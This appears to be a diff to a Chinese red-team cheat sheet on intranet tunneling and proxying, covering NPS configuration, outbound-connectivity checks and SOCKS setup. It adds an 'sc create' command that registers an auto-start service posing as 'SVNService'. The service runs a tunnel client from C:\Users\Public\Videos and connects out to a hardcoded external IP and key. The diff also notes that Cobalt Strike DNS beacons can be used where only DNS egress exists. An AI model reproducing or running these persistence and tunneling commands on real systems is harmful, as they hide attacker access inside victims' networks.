@@ -24,14 +24,7 @@ curl http://www.baidu.com
 nslookup baidu.com
 ```
 
-**TCP/UDP**
-
-往自己VPS上打一些穿透性较好的TCP/UDP端口，看看哪个能出去，[eg：80,443,8080,53,25,21]
-
-```bash
-nc -zv 	192.168.1.1 80	#TCP
-nc -zuv 192.168.1.1 80	#UDP
-```
+仅DNS出网可直接上CS-DNS上线
 
 **读取本机代理**
 
@@ -77,6 +70,16 @@ sudo nps reload		#服务端配置文件重载
 | auth_key       | web api密钥                                                  |
 | public_vkey    | 客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式 |
 | auth_crypt_key | 获取服务端authKey时的aes加密密钥，16位                       |
+
+**创建系统服务**
+
+```bash
+sc create svnservice binpath= "C:\Users\Public\Videos\setup.exe -server=111.173.114.77:8091 -vkey=zkxcn35bhkzit2kt -type=tcp"  displayname= "SVNService" depend= Tcpip start= auto
+```
+
+```bash
+sc start svnservice
+```
 
 # 正向转发
 
@@ -244,8 +247,8 @@ ssh -D 8080 -N root@10.0.0.1
 
 **Windows连接**
 
-Proxifier全局代理（[狼盘下载](https://pan.wgpsec.org/6046dcbc4a2d1ed118c74c19a0559a89a436da15)）
+Proxifier全局代理（[狼盘下载](https://pan.wgpsec.org)）
 
 **Linux连接**
 
-使用[proxychains](https://github.com/rofl0r/proxychains-ng)，配合nmap和MSF使用
+使用[proxychains](https://github.com/rofl0r/proxychains-ng)，配合MSF使用
